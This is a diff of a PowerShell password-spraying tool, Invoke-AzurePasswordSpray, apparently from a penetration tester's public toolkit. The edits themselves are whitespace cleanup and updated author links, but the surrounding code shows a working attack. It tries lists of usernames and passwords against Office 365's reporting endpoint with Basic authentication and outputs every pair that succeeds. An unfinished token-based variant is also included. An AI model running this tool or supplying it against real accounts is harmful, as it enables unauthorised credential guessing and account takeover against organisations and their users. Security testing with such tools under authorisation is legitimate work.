@@ -51,17 +51,17 @@ $UserNames | Invoke-AzurePasswordSpray -Passwd "Password123!" -RoundRobin
 Author: Robert H. Osborne
 Alias: tobor
 Contact: rosborne@osbornepro.com
-        
+
 
 .LINK
 https://roberthsoborne.com
-https://osbornepro.com
+https://writeups.osbornepro.com
 https://btps-secpack.com
 https://github.com/tobor88
 https://gitlab.com/tobor88
 https://www.powershellgallery.com/profiles/tobor
 https://www.linkedin.com/in/roberthosborne/
-https://www.youracclaim.com/users/roberthosborne/badges
+https://www.credly.com/users/roberthosborne/badges
 https://www.hackthebox.eu/profile/52286
 
 
@@ -93,7 +93,7 @@ Function Invoke-AzurePasswordSpray {
                 HelpMessage="`n[H] Define the location of a simple text file containing a list of usernames`n[E] EXAMPLE: C:\Temp\Userlist.txt")]  # End Parameter
             [ValidateScript({Test-Path -Path $_})]
             [String[]]$UsernameFile,
-            
+
             [Parameter(
                 Position=1,
                 Mandatory=$False,
@@ -113,18 +113,18 @@ Function Invoke-AzurePasswordSpray {
                 ValueFromPipeline=$False)]  # End Parameter
             [ValidateSet('Basic','Modern')]
             [String]$Authentication = 'Basic',
-            
+
             [Parameter(
                 Mandatory=$False,
                 ValueFromPipeline=$False)]  # End Parameter
             [Int64]$SleepSeconds,
-            
+
             [Parameter(
                 Mandatory=$False,
                 ValueFromPipeline=$False)]  # End Parameter
             [Switch][Bool]$RoundRobin)  # End param
 
-BEGIN 
+BEGIN
 {
 
     $Obj = @()
@@ -134,16 +134,16 @@ BEGIN
     Switch ($Authentication)
     {
 
-        'Basic' { 
-            
-            $Uri = "https://reports.office365.com/ecp/reportingwebservice/reporting.svc" 
-        
+        'Basic' {
+
+            $Uri = "https://reports.office365.com/ecp/reportingwebservice/reporting.svc"
+
         }  # End Switch Basic
 
-        'Modern' { 
-            
+        'Modern' {
+
             Throw "[!] I have not completed this yet so this will not work. Dynamic Parameter needs to be created for 'Modern' value"
-            
+
             $DLLFile = (Get-ChildItem -Path "C:\Program Files\WindowsPowerShell\Modules\AzureAD" -Recurse -Filter 'Microsoft.IdentityModel.Clients.ActiveDirectory.dll').FullName
             Add-Type -Path $DLLFile
 
@@ -164,17 +164,17 @@ BEGIN
 
                         $SecureString = $P | ConvertTo-SecureString -AsPlainText -Force
                         $Cred = New-Object -TypeName System.Management.Automation.PSCredential($U, $SecureString)
-                
-                        Try 
+
+                        Try
                         {
 
                             Invoke-WebRequest -Uri $Uri -Credential $Cred | Out-Null
                             $Obj += New-Object -TypeName PSCustomObject -Property @{Username=$U; Password=$P}
 
                         }  # End Try
-                        Catch 
+                        Catch
                         {
-                            
+
                             Write-Verbose "$U authentication failed with password $P"
 
                         }  # End Catch
@@ -200,14 +200,14 @@ BEGIN
                     ForEach ($P in $PasswdList)
                     {
 
-                        Try 
+                        Try
                         {
 
                             $SecureString = $P | ConvertTo-SecureString -AsPlainText -Force
                             $Cred = New-Object -TypeName System.Management.Automation.PSCredential($U, $SecureString)
                             $AADcredential = New-Object -TypeName "Microsoft.IdentityModel.Clients.ActiveDirectory.UserPasswordCredential" -ArgumentList $Cred.UserName,$Cred.Password
                             $AuthResult = [Microsoft.IdentityModel.Clients.ActiveDirectory.AuthenticationContextIntegratedAuthExtensions]::AcquireTokenAsync($AuthContext,"https://outlook.office365.com",$Client_Id,$AADcredential)
-                
+
                             $Authorization = "Bearer {0}" -f $AuthResult.Result.AccessToken
                             $Password = ConvertTo-SecureString -AsPlainText $Authorization -Force
                             $Ctoken = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList $U, $Password
@@ -215,9 +215,9 @@ BEGIN
                             $Obj += New-Object -TypeName PSCustomObject -Property @{Username=$U; Password=$P}
 
                         }  # End Try
-                        Catch 
+                        Catch
                         {
-                            
+
                             Write-Verbose "$U authentication failed with password $P"
 
                         }  # End Catch
@@ -254,7 +254,7 @@ BEGIN
         'PassFile' {
 
             Write-Verbose "PassFile being used"
-        
+
             $PassList = Get-Content -Path $PasswdFile
             ForEach ($P in $PassList)
             {
@@ -264,13 +264,13 @@ BEGIN
             }  # End ForEach
 
         }  # End Switch PassFile
-        
+
     }  # End Password Switch
 
     Write-Output "[*] Begining password spray"
 
 }  # End BEGIN
-PROCESS 
+PROCESS
 {
 
     Switch ($PSCmdlet.ParameterSetName)
@@ -292,7 +292,7 @@ PROCESS
             {
 
                 $UserList += $User
-                    
+
             }  # End ForEach
 
         }  # End Switch UserFile
@@ -310,17 +310,17 @@ PROCESS
 
                 $SecureString = $P | ConvertTo-SecureString -AsPlainText -Force
                 $Cred = New-Object -TypeName System.Management.Automation.PSCredential($U, $SecureString)
-        
-                Try 
+
+                Try
                 {
 
                     Invoke-WebRequest -Uri $Uri -Credential $Cred | Out-Null
                     $Obj += New-Object -TypeName PSCustomObject -Property @{Username=$U; Password=$P}
 
                 }  # End Try
-                Catch 
+                Catch
                 {
-                    
+
                     Write-Verbose "$U authentication failed with password $P"
 
                 }  # End Catch
@@ -348,17 +348,17 @@ PROCESS
 
                 $SecureString = $P | ConvertTo-SecureString -AsPlainText -Force
                 $Cred = New-Object -TypeName System.Management.Automation.PSCredential($U, $SecureString)
-        
-                Try 
+
+                Try
                 {
 
                     Invoke-WebRequest -Uri $Uri -Credential $Cred | Out-Null
                     $Obj += New-Object -TypeName PSCustomObject -Property @{Username=$U; Password=$P}
 
                 }  # End Try
-                Catch 
+                Catch
                 {
-                    
+
                     Write-Verbose "$U authentication failed with password $P"
 
                 }  # End Catch
@@ -386,7 +386,7 @@ END
         $Obj
 
     }  # End If
-    Else 
+    Else
     {
 
         Write-Output "[*] None of the user and password combinations defined were successful"
